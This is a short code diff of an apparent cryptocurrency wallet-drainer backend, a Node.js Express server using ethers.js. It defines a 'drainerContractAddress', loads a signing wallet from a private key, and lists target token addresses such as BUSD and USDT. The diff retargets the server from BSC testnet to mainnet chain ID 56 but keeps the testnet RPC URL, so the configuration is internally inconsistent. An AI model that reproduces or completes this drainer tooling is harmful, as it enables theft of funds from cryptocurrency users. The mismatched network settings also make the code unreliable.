@@ -12,15 +12,14 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-const BSC_TESTNET_CHAIN_ID = 97;
-const provider = new ethers.JsonRpcProvider("https://bsc-testnet-dataseed.bnbchain.org/", BSC_TESTNET_CHAIN_ID);
+const BSC_MAINNET_CHAIN_ID = 56;
+const provider = new ethers.JsonRpcProvider("https://bsc-testnet-dataseed.bnbchain.org/", BSC_MAINNET_CHAIN_ID);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);
 
 const drainerContractAddress = "0xd58eeFeF184192Ed19c5b1DfEc06A082f84c66d3";
 
 const tokenList = [
   { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
-  { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
   { symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 },
 ];
 
